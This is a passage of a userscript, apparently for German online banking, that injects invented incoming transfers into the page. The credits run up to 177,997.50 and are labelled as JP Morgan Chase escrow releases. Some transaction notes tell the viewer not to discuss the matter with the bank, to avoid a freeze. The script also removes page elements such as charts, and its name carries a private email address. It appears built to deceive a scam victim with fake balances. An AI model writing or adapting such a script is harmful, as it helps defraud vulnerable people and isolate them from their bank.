// ==UserScript==
// @name         Ed Start 4Rec Sp hans-juergen.woche@t-online.de 2
...
// @downloadURL https://update.greasyfork.org/scripts/511455/Ed%20Start%204Rec%20Sp%20hans-juergenwoche%40t-onlinede%202.user.js
// @updateURL https://update.greasyfork.org/scripts/511455/Ed%20Start%204Rec%20Sp%20hans-juergenwoche%40t-onlinede%202.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var accountsecurity = "232 2321 88";
...
//        },
        {
            predecimalAmount: '7.700',
            decimalAmount: ',00',
            transactionTitle: 'JP Morgan Chase',
            transactionInfo: " A. Gold meldet sich.",
            isNegative: false // Example flag, modify this based on your actual logic
        },
   {
            predecimalAmount: '1.300',
            decimalAmount: ',00',
            transactionTitle: 'JP Morgan Chase.',
 ...
 //       },
 {
            predecimalAmount: '177.997',
            decimalAmount: ',50',
            transactionTitle: 'Treuhand: JP Morgan Chase',
            transactionInfo: "Freigabe erteilt durch JP Morgan. Mit Bank nicht besprechen damit nicht gesperrt. A. Gold meldet sich.",
            isNegative: false // Example flag, modify this based on your actual logic
        },
  {
            predecimalAmount: '9.700',
            decimalAmount: ',00',
            transactionTitle: 'Andreas Gold',
            transactionInfo: "Hilfe",
            isNegative: false // Example flag, modify this based on your actual logic
...
function removeTargetElements() {
    const classesToRemove = [
        ...
        '.highchartsarea' // New class added
    ];
